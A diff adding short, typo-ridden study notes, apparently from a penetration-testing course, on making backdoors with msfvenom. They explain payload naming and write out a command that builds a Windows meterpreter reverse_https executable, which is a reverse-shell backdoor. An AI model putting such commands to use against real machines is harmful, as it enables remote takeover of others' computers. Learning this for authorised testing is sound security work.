@@ -1,0 +1,20 @@
+73)
+We generate backboors using the function msfvenom
+msfvenom --list payloads ->lists all the payloads that it has
+
+Platform/Type of payload/Coomunication channel
+windows/shell/reverse_http
+
+communication has two parts 
+1_direction of coonection
+2)type of protocol
+
+74)
+
+msfvenom --payload windows/meterpreter/reverse_https --list
+msfvenom --payload windows/meterpreter/reverse_https LPORT 8080 --format exe --out rev_https_8080.exe
+The above code generates a backdoor for the current working director
+
+75)
+
+
